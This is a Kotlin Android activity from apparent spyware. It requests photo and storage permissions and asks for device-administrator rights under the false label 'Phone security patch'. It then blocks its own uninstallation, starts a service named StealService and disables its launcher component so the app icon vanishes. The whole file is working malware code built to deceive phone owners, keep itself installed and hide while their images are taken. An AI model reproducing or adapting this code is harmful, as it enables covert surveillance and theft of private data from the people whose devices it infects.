package com.s.sync

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle

class MainActivity : Activity() {

    private val cn by lazy { ComponentName(this, AdminReceiver::class.java) }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val p = if (Build.VERSION.SDK_INT >= 33)
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.POST_NOTIFICATIONS)
        else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        requestPermissions(p, 1)
    }

    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
        super.onRequestPermissionsResult(r, p, g)
        val need = if (Build.VERSION.SDK_INT >= 33)
            Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
        if (checkSelfPermission(need) == PackageManager.PERMISSION_GRANTED) admin() else finish()
    }

    private fun admin() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (dpm.isAdminActive(cn)) { done(); return }
        runCatching {
            startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
                .putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Phone security patch"), 2)
        }.onFailure { done() }
    }

    override fun onActivityResult(r: Int, res: Int, d: Intent?) {
        super.onActivityResult(r, res, d)
        done()
    }

    private fun done() {
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        runCatching { if (dpm.isAdminActive(cn)) dpm.setUninstallBlocked(cn, packageName, true) }

        val s = Intent(this, StealService::class.java)
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(s) else startService(s)

        runCatching {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
        }
        finish()
    }
}